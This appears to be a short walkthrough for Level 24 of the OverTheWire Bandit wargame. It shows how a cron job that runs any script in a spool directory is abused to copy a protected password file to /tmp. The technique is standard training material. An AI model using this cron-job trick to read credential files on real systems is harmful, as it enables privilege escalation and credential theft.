# Level 24

We first ```cat``` */etc/cron.d/cronjob_bandit24* to see the following:  

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```  

We then ```cat``` into the */usr/bin/cronjob_bandit24.sh* to see the following:  

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done
 ]
```  

We then realize that all scripts are run by the cronjob in */var/spool/* directory. Because of this we create a script by redirecting ```cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt``` to a file in the directory */var/spool/bandit24* so that it gets run. This is done by running the following:  

```
echo 'cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt' > /var/spool/bandit24/a.sh &&   
chmod +x /var/spool/bandit24/a.sh &&  
sleep 1m &&  
cat /tmp/pass_bandit24.txt
```

Finally, we ssh to verify the passkey obtained above.

```ssh -p 2220 bandit24@bandit.labs.overthewire.org```
